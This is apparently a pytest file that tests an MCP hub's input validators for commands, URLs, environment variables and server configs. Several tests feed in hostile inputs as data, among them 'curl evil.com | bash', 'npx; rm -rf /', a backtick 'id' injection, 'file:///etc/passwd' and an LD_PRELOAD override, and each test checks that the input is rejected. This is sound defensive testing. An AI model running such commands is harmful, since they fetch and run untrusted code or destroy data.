import pytest
from src.mcp_hub.validators import (
    ValidationError,
    validate_command, validate_url, validate_env, validate_server_config,
)


class TestValidateCommand:
    def test_simple_passes(self):
        assert validate_command("npx") == "npx"

    def test_path_passes(self):
        assert validate_command("/usr/bin/node") == "/usr/bin/node"

    def test_env_template_passes(self):
        """${VAR} templates must pass — they're expanded later by env_expand."""
        assert validate_command("${HOME}/bin/node") == "${HOME}/bin/node"

    def test_env_template_default_passes(self):
        assert validate_command("${NODE_PATH:-/usr/bin/node}") == "${NODE_PATH:-/usr/bin/node}"

    def test_dollar_subshell_blocked(self):
        with pytest.raises(ValidationError):
            validate_command("$(curl evil.com)")

    def test_pipe_blocked(self):
        with pytest.raises(ValidationError):
            validate_command("curl evil.com | bash")

    def test_semicolon_blocked(self):
        with pytest.raises(ValidationError):
            validate_command("npx; rm -rf /")

    def test_backtick_blocked(self):
        with pytest.raises(ValidationError):
            validate_command("npx `id`")

    def test_empty_blocked(self):
        with pytest.raises(ValidationError):
            validate_command("")


class TestValidateUrl:
    def test_https_passes(self):
        assert validate_url("https://example.com") == "https://example.com"

    def test_http_passes(self):
        assert validate_url("http://localhost:3000") == "http://localhost:3000"

    def test_uppercase_scheme_passes(self):
        """RFC 3986: schemes are case-insensitive."""
        assert validate_url("HTTP://example.com") == "HTTP://example.com"

    def test_file_blocked(self):
        with pytest.raises(ValidationError):
            validate_url("file:///etc/passwd")

    def test_gopher_blocked(self):
        with pytest.raises(ValidationError):
            validate_url("gopher://evil.com")


class TestValidateEnv:
    def test_simple_passes(self):
        assert validate_env({"FOO": "bar"}) == {"FOO": "bar"}

    def test_path_blocked(self):
        with pytest.raises(ValidationError):
            validate_env({"PATH": "/evil/bin"})

    def test_ld_preload_blocked(self):
        with pytest.raises(ValidationError):
            validate_env({"LD_PRELOAD": "/evil.so"})

    def test_env_template_value_allowed(self):
        """Values with ${VAR} are fine — they get expanded."""
        result = validate_env({"TOKEN": "${BRAVE_API_KEY:-}"})
        assert result["TOKEN"] == "${BRAVE_API_KEY:-}"


class TestValidateServerConfig:
    def test_valid_command(self):
        cfg = {"command": "npx", "args": ["-y", "pkg"]}
        validate_server_config("test", cfg)

    def test_valid_url(self):
        cfg = {"url": "https://example.com/mcp"}
        validate_server_config("test", cfg)

    def test_name_special_chars_blocked(self):
        with pytest.raises(ValidationError):
            validate_server_config("bad/name", {"command": "npx"})

    def test_no_url_or_command_blocked(self):
        with pytest.raises(ValidationError):
            validate_server_config("test", {"tags": ["a"]})
